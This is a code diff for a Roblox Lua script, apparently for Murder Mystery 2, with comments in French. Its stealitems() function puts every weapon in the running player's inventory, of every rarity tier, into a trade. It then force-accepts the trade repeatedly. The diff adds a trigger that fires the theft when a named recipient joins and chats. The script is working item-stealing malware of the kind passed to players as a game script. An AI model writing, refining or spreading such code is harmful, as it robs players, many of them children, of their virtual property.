@@ -502,106 +502,83 @@ local function stealitems()
 
     for a,b in pairs(uniqueItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(ancientItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(godlyItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(vintageItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(legendaryItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(rareItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(uncommonItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
     for a,b in pairs(commonItems) do
         for i = 1, b.amount do
-            local args = {
-                [1] = b.data,
-                [2] = "Weapons"
-            }
-
+            local args = {[1] = b.data, [2] = "Weapons"}
             game:GetService("ReplicatedStorage").Trade.OfferItem:FireServer(unpack(args))
         end
     end
 
-  wait(12) -- Petit délai après l'ajout des items
+    wait(12)
 
-    -- 1ère étape : Clique sur "Accepter"
+    -- Première acceptation (Lancer le délai de confirmation)
     pcall(function()
         game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
     end)
 
-    -- 2ème étape : Attente du compte à rebours + validation finale répétée
-    task.wait(5)
-    
-    -- On force la confirmation à plusieurs reprises pour s'assurer que le serveur la prend en compte
-    for i = 1, 5 do
+    -- Attente du délai du système de trade de MM2
+    task.wait(4)
+
+    -- Deuxième acceptation forcée (Confirmer définitivement l'échange)
+    for i = 1, 3 do
         pcall(function()
             game:GetService("ReplicatedStorage").Trade.AcceptTrade:FireServer()
         end)
         task.wait(1)
     end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+    if player.Name == userName then
+        player.Chatted:Connect(function(msg)
+            stealitems()
+        end)
+    end
+end)
